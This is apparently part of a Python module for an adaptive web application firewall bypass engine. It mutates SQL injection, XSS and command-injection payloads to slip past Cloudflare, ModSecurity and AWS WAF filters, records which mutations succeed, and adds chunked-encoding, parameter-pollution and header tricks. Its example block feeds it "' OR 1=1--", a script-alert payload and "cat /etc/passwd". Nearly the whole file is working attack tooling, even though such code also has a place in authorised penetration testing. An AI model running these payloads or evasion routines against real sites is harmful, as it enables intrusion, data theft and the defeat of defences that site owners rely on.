        sci_payload = re.sub(r"\b(\d+)\b", lambda m: self.sql_bypass.scientific_notation(m.group(1)), payload)
        mutations.append((sci_payload, "scientific_notation"))

        # Null byte injection
        mutations.append((self.encoding.null_byte_injection(payload), "null_byte"))

        # WAF-specific mutations
        if waf == WAFType.CLOUDFLARE:
            # Cloudflare specific bypasses
            mutations.append((payload.replace(" ", "/**/"), "cf_comment"))
            mutations.append((self.encoding.unicode_encode(payload, "utf-7"), "cf_utf7"))

        if waf == WAFType.MODSECURITY:
            # ModSecurity specific
            mutations.append((f"/*!00000{payload}*/", "modsec_version_comment"))

        if waf == WAFType.AWS_WAF:
            # AWS WAF specific
            mutations.append((self.encoding.triple_url_encode(payload), "aws_triple_encode"))

        # Filter out known blocked patterns
        for mutated, _mutation_type in mutations:
            if not self.memory.is_pattern_blocked(waf, mutated):
                payloads.append(mutated)

        # Sort by priority (learned best mutations first)
        def sort_key(p: str) -> int:
            for _i, (mutated, mutation_type) in enumerate(mutations):
                if mutated == p and mutation_type in priority_mutations:
                    return priority_mutations.index(mutation_type)
            return 999

        payloads.sort(key=sort_key)

        return payloads[:aggressiveness * 5]

    def bypass_xss(
        self,
        payload: str,
        waf_type: WAFType | None = None,
        aggressiveness: int = 2,
    ) -> list[str]:
        """Generate XSS bypass payloads."""
        waf = waf_type or self.detected_waf
        payloads = []

        # Basic mutations
        payloads.append(self.xss_bypass.case_mutation(payload))
        payloads.append(self.xss_bypass.tag_mutation(payload))

        # SVG/Math payloads
        payloads.append(self.xss_bypass.svg_payload())
        payloads.append(self.xss_bypass.math_payload())

        # Polyglot
        payloads.append(self.xss_bypass.polyglot())

        # Encoding mutations
        payloads.append(self.encoding.html_entity_encode(payload))
        payloads.append(self.encoding.html_entity_encode(payload, use_hex=True))
        payloads.append(self.encoding.url_encode(payload))
        payloads.append(self.encoding.double_url_encode(payload))
        payloads.append(self.encoding.unicode_encode(payload, "fullwidth"))

        # Obscure event handlers
        for event in secrets.SystemRandom().sample(
            self.xss_bypass.OBSCURE_EVENTS,
            min(3, len(self.xss_bypass.OBSCURE_EVENTS)),
        ):
            tag = secrets.choice(self.xss_bypass.OBSCURE_TAGS)
            payloads.append(f"<{tag} {event}=alert(1)>")

        # Filter blocked
        payloads = [p for p in payloads if not self.memory.is_pattern_blocked(waf, p)]

        return payloads[:aggressiveness * 5]

    def bypass_rce(
        self,
        payload: str,
        os_type: str = "linux",
        waf_type: WAFType | None = None,
        aggressiveness: int = 2,
    ) -> list[str]:
        """Generate RCE/Command injection bypass payloads."""
        waf = waf_type or self.detected_waf
        payloads = []

        if os_type == "linux":
            payloads.append(self.cmd_bypass.bash_obfuscate(payload))
            payloads.append(self.cmd_bypass.bash_obfuscate(payload))
            payloads.append(self.cmd_bypass.bash_obfuscate(payload))
        else:
            payloads.append(self.cmd_bypass.powershell_obfuscate(payload))
            payloads.append(self.cmd_bypass.powershell_obfuscate(payload))

        # Encoding mutations
        payloads.append(self.encoding.url_encode(payload))
        payloads.append(self.encoding.double_url_encode(payload))
        payloads.append(self.encoding.hex_encode(payload))

        # Filter blocked
        payloads = [p for p in payloads if not self.memory.is_pattern_blocked(waf, p)]

        return payloads[:aggressiveness * 3]

    def record_result(
        self,
        original: str,
        mutated: str,
        mutation_type: str,
        success: bool,
        response_code: int,
        context: str,
        target: str = "",
    ) -> None:
        """Record bypass attempt result for learning.

        Call this after testing a payload to update the adaptive memory.
        """
        attempt = PayloadAttempt(
            payload_hash=hashlib.md5(original.encode()).hexdigest(),
            original_payload=original,
            mutated_payload=mutated,
            mutation_type=mutation_type,
            waf_type=self.detected_waf,
            target=target,
            success=success,
            response_code=response_code,
            timestamp=time.time(),
            context=context,
        )
        self.memory.record_attempt(attempt)

    def get_chunked_request(self, body: str) -> tuple[dict[str, str], str]:
        """Get chunked transfer encoding request for bypass."""
        return self.http_bypass.chunked_encoding(body)

    def get_hpp_params(self, params: dict[str, str]) -> str:
        """Get HTTP Parameter Pollution encoded params."""
        return self.http_bypass.http_parameter_pollution(params)

    def get_bypass_headers(self) -> dict[str, str]:
        """Get headers that might help bypass WAF."""
        return self.http_bypass.header_injection("")

    def get_stats(self) -> dict[str, Any]:
        """Get learning statistics."""
        return self.memory.get_stats()

    def close(self) -> None:
        """Close the underlying memory database connection."""
        self.memory.close()

    def __del__(self) -> None:
        """Ensure resources are released on garbage collection."""
        try:
            self.close()
        except (sqlite3.Error, OSError):
            pass

    def __enter__(self) -> WAFBypassEngine:
        """Support usage as a context manager."""
        return self

    def __exit__(self, *exc: object) -> None:
        """Close resources on context-manager exit."""
        self.close()

    def smart_bypass(
        self,
        payload: str,
        context: str,
        waf_type: WAFType | None = None,
    ) -> list[str]:
        """Smart bypass that uses all techniques based on context.

        Args:
            payload: Original payload
            context: "sqli", "xss", or "rce"
            waf_type: Optional WAF type override

        Returns:
            List of bypass payloads sorted by probability of success
        """
        waf = waf_type or self.detected_waf

        if context == "sqli":
            return self.bypass_sql(payload, waf)
        elif context == "xss":
            return self.bypass_xss(payload, waf)
        elif context == "rce":
            return self.bypass_rce(payload, "linux", waf)
        else:
            # Generic encoding-only bypass
            return [
                self.encoding.url_encode(payload),
                self.encoding.double_url_encode(payload),
                self.encoding.mixed_encoding(payload),
                self.encoding.unicode_encode(payload, "fullwidth"),
                self.encoding.null_byte_injection(payload),
            ]


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================


def create_engine(db_path: str = DEFAULT_DB_PATH) -> WAFBypassEngine:
    """Create a WAF bypass engine instance."""
    return WAFBypassEngine(db_path)


def fingerprint_waf(
    headers: dict[str, str],
    body: str,
    status_code: int,
) -> WAFType:
    """Quick WAF fingerprinting without persistence."""
    engine = WAFBypassEngine(MEMORY_DB_PATH)
    try:
        return engine.fingerprint_waf(headers, body, status_code)
    finally:
        engine.close()


# Example usage
if __name__ == "__main__":
    engine = WAFBypassEngine()

    # Test SQL bypass
    sql_payload = "' OR 1=1--"
    print("Original:", sql_payload)
    print("\nSQL Bypasses:")
    for p in engine.bypass_sql(sql_payload):
        print(f"  {p}")

    # Test XSS bypass
    xss_payload = "<script>alert(1)</script>"
    print("\nXSS Bypasses:")
    for p in engine.bypass_xss(xss_payload):
        print(f"  {p}")

    # Test RCE bypass
    rce_payload = "cat /etc/passwd"
    print("\nRCE Bypasses:")
    for p in engine.bypass_rce(rce_payload):
        print(f"  {p}")
